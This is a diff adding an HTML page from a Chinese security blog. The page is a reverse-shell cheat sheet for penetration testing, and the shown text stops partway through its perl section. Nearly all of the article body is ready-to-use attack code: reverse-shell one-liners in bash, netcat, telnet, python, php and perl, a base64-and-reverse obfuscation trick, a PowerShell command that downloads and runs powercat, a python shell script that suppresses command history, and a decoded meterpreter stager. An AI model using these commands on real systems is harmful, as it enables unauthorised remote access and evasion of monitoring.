@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="反弹shell汇总注意有些反弹shell的方法或脚本只适用于Linux或者Windows，注意区分相关脚本的编写方式方法。 bash12bash -i &gt;&amp; &#x2F;dev&#x2F;[tcp|udp]&#x2F;[host]&#x2F;[port] 0&gt;&amp;1&#x2F;bin&#x2F;bash  -i &gt; &#x2F;dev&#x2F;[tcp&#x2F;udp]&#x2F;[host]&#x2F;[port] 0&lt;&amp;1 2&gt;&amp;1  b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell">
+<meta property="og:url" content="https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:site_name" content="YangTuBlog">
+<meta property="og:description" content="反弹shell汇总注意有些反弹shell的方法或脚本只适用于Linux或者Windows，注意区分相关脚本的编写方式方法。 bash12bash -i &gt;&amp; &#x2F;dev&#x2F;[tcp|udp]&#x2F;[host]&#x2F;[port] 0&gt;&amp;1&#x2F;bin&#x2F;bash  -i &gt; &#x2F;dev&#x2F;[tcp&#x2F;udp]&#x2F;[host]&#x2F;[port] 0&lt;&amp;1 2&gt;&amp;1  b">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-05-04T09:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-25T14:58:16.386Z">
+<meta property="article:author" content="YangTu">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>反弹shell</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/tags/%E5%AE%89%E5%85%A8/">安全</a></li><!--
+     --><!--
+       --><li><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></li><!--
+     --><!--
+       --><li><a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95">备忘录</a></li><!--
+     --><!--
+       --><li><a href="/archives/">所有文章</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/05/09/nps-1/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/05/02/java/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&text=反弹shell"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&title=反弹shell"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&is_video=false&description=反弹shell"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=反弹shell&body=Check out this article: https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&title=反弹shell"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&title=反弹shell"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&title=反弹shell"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&title=反弹shell"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&name=反弹shell&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&t=反弹shell"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E6%B1%87%E6%80%BB"><span class="toc-number">1.</span> <span class="toc-text">反弹shell汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bash"><span class="toc-number">1.1.</span> <span class="toc-text">bash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NatCat-nc"><span class="toc-number">1.2.</span> <span class="toc-text">NatCat(nc)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exec"><span class="toc-number">1.3.</span> <span class="toc-text">exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powercat"><span class="toc-number">1.4.</span> <span class="toc-text">powercat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#telnet"><span class="toc-number">1.5.</span> <span class="toc-text">telnet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python"><span class="toc-number">1.6.</span> <span class="toc-text">python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-number">1.7.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#perl"><span class="toc-number">1.8.</span> <span class="toc-text">perl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ruby"><span class="toc-number">1.9.</span> <span class="toc-text">ruby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java"><span class="toc-number">1.10.</span> <span class="toc-text">java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go"><span class="toc-number">1.11.</span> <span class="toc-text">go</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gcc-c"><span class="toc-number">1.12.</span> <span class="toc-text">gcc(c)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#g-c"><span class="toc-number">1.13.</span> <span class="toc-text">g++(c++)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#openssl%EF%BC%88%E5%8A%A0%E5%AF%86%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-number">1.14.</span> <span class="toc-text">openssl（加密反弹shell）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lua"><span class="toc-number">1.15.</span> <span class="toc-text">lua</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#awk"><span class="toc-number">1.16.</span> <span class="toc-text">awk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gawk"><span class="toc-number">1.17.</span> <span class="toc-text">gawk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socat"><span class="toc-number">1.18.</span> <span class="toc-text">socat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tcp"><span class="toc-number">1.18.0.1.</span> <span class="toc-text">tcp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#udp"><span class="toc-number">1.18.0.2.</span> <span class="toc-text">udp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF"><span class="toc-number">1.19.</span> <span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cobalt-strike"><span class="toc-number">1.20.</span> <span class="toc-text">Cobalt strike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nishang%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.21.</span> <span class="toc-text">Nishang反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reverse-TCP-Shell"><span class="toc-number">1.21.0.1.</span> <span class="toc-text">Reverse TCP Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reverse-UDP-Shell"><span class="toc-number">1.21.0.2.</span> <span class="toc-text">Reverse UDP Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reverse-ICMP-Shell"><span class="toc-number">1.21.0.3.</span> <span class="toc-text">Reverse ICMP Shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89powershell%E5%87%BD%E6%95%B0%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.22.</span> <span class="toc-text">自定义powershell函数反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dnscat2-%E5%8F%8D%E5%BC%B9DNS-shell"><span class="toc-number">1.23.</span> <span class="toc-text">dnscat2 反弹DNS shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%88%E8%AF%A6%E6%83%85%EF%BC%89"><span class="toc-number">1.24.</span> <span class="toc-text">补充（详情）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Empire-%E7%BB%93%E5%90%88office%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.24.0.1.</span> <span class="toc-text">Empire 结合office反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8office-OLE%E5%AF%B9%E8%B1%A1%E6%8F%92%E5%85%A5bat%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.24.0.2.</span> <span class="toc-text">利用office OLE对象插入bat文件反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerSploit-DLL%E6%B3%A8%E5%85%A5%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.24.0.3.</span> <span class="toc-text">PowerSploit DLL注入反弹shell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">实现交互式shell的几种方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#python-pty"><span class="toc-number">2.1.</span> <span class="toc-text">python pty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7nc%E4%B8%BA%E4%BA%A4%E4%BA%92shell"><span class="toc-number">2.2.</span> <span class="toc-text">升级nc为交互shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8socat"><span class="toc-number">2.3.</span> <span class="toc-text">使用socat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#script%E8%8E%B7%E5%8F%96pty"><span class="toc-number">2.4.</span> <span class="toc-text">script获取pty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8ELinux%E4%B8%AD-bin-bash%E5%92%8C-bin-sh%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.5.</span> <span class="toc-text">小知识点总结——关于Linux中#!&#x2F;bin&#x2F;bash和#!&#x2F;bin&#x2F;sh的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.5.0.1.</span> <span class="toc-text">#!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%BA%E5%88%AB"><span class="toc-number">2.5.0.2.</span> <span class="toc-text">区别</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        反弹shell
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">YangTu</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-04T09:00:00.000Z" class="dt-published" itemprop="datePublished">2023-05-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="反弹shell汇总"><a href="#反弹shell汇总" class="headerlink" title="反弹shell汇总"></a>反弹shell汇总</h1><p>注意有些反弹shell的方法或脚本只适用于Linux或者Windows，注意区分相关脚本的编写方式方法。</p>
+<h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/[tcp|udp]/[host]/[port] 0&gt;&amp;1</span><br><span class="line">/bin/bash  -i &gt; /dev/[tcp/udp]/[host]/[port] 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>base64版</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>  //其中的<span class="built_in">base64</span>字符是bash -i &gt;&amp; /dev/tcp/10.10.14.7/4444 0&gt;&amp;1的<span class="built_in">base64</span>加密</span><br></pre></td></tr></table></figure>
+
+<p>还可以引申一波</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">基础的反弹指令</span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.43.47/4444 0&gt;&amp;1&quot; | bash我们来给它混淆一下</span><br><span class="line">先给它base64一下</span><br><span class="line">ZWNobyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjQ3LzQ0NDQgMD4mMSIgfCBiYXNo然后反转一下</span><br><span class="line">oNXYiBCfgISMm4DMgQDN0QzL3QjLzQjL4YTMuITOx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ就这样套一下，也可以再套一层</span><br><span class="line">echo oNXYiBCfgISMm4DMgQDN0QzL3QjLzQjL4YTMuITOx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ | rev |base64 -d |bash套变量</span><br><span class="line">s=`echo oNXYiBCfgISMm4DMgQDN0QzL3QjLzQjL4YTMuITOx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ | rev |base64 -d |bash`;$s后面还可以套层数这是一种基础的方法，还有很多变种可以</span><br></pre></td></tr></table></figure>
+
+<h2 id="NatCat-nc"><a href="#NatCat-nc" class="headerlink" title="NatCat(nc)"></a>NatCat(nc)</h2><p> 不同版本的nc不一定支持-e：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash [host] [port]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash | nc [host] [port]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc [host] [port] 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  [host] [输入port]  |  /bin/bash  |  nc [host] [输出port]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc [host] [port] 0/tmp/</span><br></pre></td></tr></table></figure>
+
+<p>当nc版本问题时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [host] [port] &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/[host]/[port];cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 2&gt;&amp;0 0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/[host]/[port]; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
+
+<h2 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h2><p><a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">powercat</a>是netcat的powershell版本，功能免杀性都要比netcat好用的多。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://10.10.14.9:8000/powercat.ps1&#x27;);powercat -c 10.10.14.9 -p 4444 -e cmd&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet [host] [输入port] | /bin/bash | telnet [host] [输出port]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet [host] [port] 0/tmp/p</span><br></pre></td></tr></table></figure>
+
+<p>nc不可用或者&#x2F;dev&#x2F;tcp不可用时:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet [host] [port] 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span>  os</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">lhost = <span class="string">&quot;&quot;</span></span><br><span class="line">lport = <span class="number">4444</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">   s.connect((lhost, lport))</span><br><span class="line">   os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">   os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">   os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">   os.putenv(<span class="string">&quot;HISTFILE&quot;</span>, <span class="string">&#x27;/dev/null&#x27;</span>)</span><br><span class="line">   pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">   <span class="comment">#os.remove(&#x27;/tmp/.t.py&#x27;)</span></span><br><span class="line">   s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   main()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&#x27;ip&#x27;,port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=ip LPORT=port</span><br><span class="line">import base64; exec(base64.b64decode(&#x27;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg==&#x27;))</span><br><span class="line">上面那段的base64解码为：</span><br><span class="line">import socket,struct</span><br><span class="line">s=socket.socket(2,1)</span><br><span class="line">s.connect((&#x27;192.168.90.1&#x27;,1234))</span><br><span class="line">l=struct.unpack(&#x27;&gt;I&#x27;,s.recv(4))[0]</span><br><span class="line">d=s.recv(4096)</span><br><span class="line">while len(d)!=l:</span><br><span class="line">	d+=s.recv(4096)</span><br><span class="line">exec(d,&#123;&#x27;s&#x27;:s&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>python升级完美pty：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/[host]/[port]&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;[host]&quot;,[port]);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>配合nc使用，其他的也一样:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [host] [port] &gt;/tmp/f&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;[host]&quot;;$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>不依赖&#x2F;bin&#x2F;sh</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;[host]:[port]&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
